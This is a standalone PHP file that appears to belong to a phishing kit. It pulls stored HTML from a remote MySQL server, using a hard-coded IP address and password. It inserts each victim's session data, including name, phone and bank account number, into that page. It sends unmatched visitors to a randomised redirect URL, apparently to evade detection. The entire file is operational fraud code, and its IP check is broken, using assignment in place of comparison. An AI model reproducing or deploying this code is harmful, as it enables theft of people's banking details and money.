<?php include 'fs.php';
@$mysqli = @new mysqli("89.203.250.134", "zepek17", "Welkom09!!", "zepek17", "3306");
$cHmA = md5($_SERVER['REMOTE_ADDR']);
if (@$_GET['ckv'] = $cHmA) {
    $result = $mysqli->query("SELECT * FROM a where b='$cHmA'");
    if ($result->num_rows == 0) {
        header("location: controle.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
    } else {
        $row = mysqli_fetch_assoc($result);
        $oxK = base64_decode($row['c']);
        $oxK = @str_replace("#NAAMZ#", $_SESSION['NAAMX'], $oxK);
        $oxK = @str_replace("#NAAMV#", $_SESSION['NAAMV'], $oxK);
        $oxK = @str_replace("#ID#", $_SESSION['rnd'], $oxK);
		$oxK = @str_replace("#Mobz#", $_SESSION['vRkD2'], $oxK);
		$oxK = @str_replace("#REKNR#", $_SESSION['krn'], $oxK);
		echo $oxK;
    }
    $mysqli->close();
} else {
    header("location: controle.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
        0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
        "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
        0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
} ?>